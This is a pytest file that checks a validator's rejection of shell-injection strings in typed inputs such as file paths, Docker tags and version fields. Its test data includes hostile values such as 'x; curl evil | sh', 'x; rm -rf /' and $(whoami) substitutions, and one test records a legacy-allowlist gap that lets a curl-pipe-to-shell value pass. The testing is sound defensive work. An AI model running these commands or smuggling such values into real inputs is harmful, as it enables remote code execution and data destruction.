"""Tests for convention-driven security validation in validation_core."""

from __future__ import annotations

import sys
from pathlib import Path

PROJECT_ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(PROJECT_ROOT / "_tests" / "shared"))

from validation_core import ValidationCore  # noqa: E402


class TestConventionDrivenSecurity:
    def setup_method(self) -> None:
        self.validator = ValidationCore()

    def test_typed_input_rejects_semicolon(self) -> None:
        ok, _ = self.validator.validate_security_patterns(
            "x; curl evil | sh",
            input_name="prefix",
            convention="file_path",
        )
        assert ok is False

    def test_typed_input_rejects_backtick(self) -> None:
        ok, _ = self.validator.validate_security_patterns(
            "x`whoami`",
            input_name="tag",
            convention="docker_tag",
        )
        assert ok is False

    def test_typed_input_rejects_command_substitution(self) -> None:
        ok, _ = self.validator.validate_security_patterns(
            "x$(whoami)",
            input_name="image",
            convention="docker_image_name",
        )
        assert ok is False

    def test_typed_input_rejects_double_ampersand(self) -> None:
        ok, _ = self.validator.validate_security_patterns(
            "x && echo pwn",
            input_name="version",
            convention="semantic_version",
        )
        assert ok is False

    def test_typed_input_accepts_clean_value(self) -> None:
        ok, _ = self.validator.validate_security_patterns(
            "1.2.3",
            input_name="version",
            convention="semantic_version",
        )
        assert ok is True

    def test_unknown_convention_falls_back_to_legacy_allowlist(self) -> None:
        ok, _ = self.validator.validate_security_patterns(
            "x; rm -rf /",
            input_name="whatever",
            convention=None,
        )
        assert ok is False

    def test_unknown_convention_accepts_non_matching_injection(self) -> None:
        # Documents the behavior: no convention -> legacy allowlist -> misses.
        ok, _ = self.validator.validate_security_patterns(
            "x; curl evil | sh",
            input_name="whatever",
            convention=None,
        )
        assert ok is True

    def test_empty_value_always_accepted(self) -> None:
        ok, _ = self.validator.validate_security_patterns(
            "",
            input_name="version",
            convention="semantic_version",
        )
        assert ok is True
